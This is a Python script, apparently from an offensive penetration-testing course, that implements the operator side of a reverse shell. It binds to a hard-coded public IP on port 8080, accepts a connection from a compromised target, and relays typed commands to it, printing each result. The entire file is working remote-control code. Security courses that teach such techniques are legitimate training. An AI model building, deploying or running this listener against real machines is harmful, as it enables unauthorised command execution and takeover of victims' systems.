# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket

def connect():

    s = socket.socket()
    s.bind(("157.245.44.49", 8080))
    s.listen(1) # define the backlog size for the Queue, I made it 1 as we are expecting a single connection from a single
    conn, addr = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source port in a tuple format (IP,port)
    print ('[+] We got a connection from', addr)

    while True:

        command = input("Shell> ")
        
        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
            conn.send('terminate'.encode())
            conn.close()
            break
        elif not command:
            conn.send('whoami'.encode())
            print( conn.recv(102400).decode())
        else:
            conn.send(command.encode()) # Otherwise we will send the command to the target
            print( conn.recv(102400).decode()) # print the result that we got back

def main():
    connect()
main()
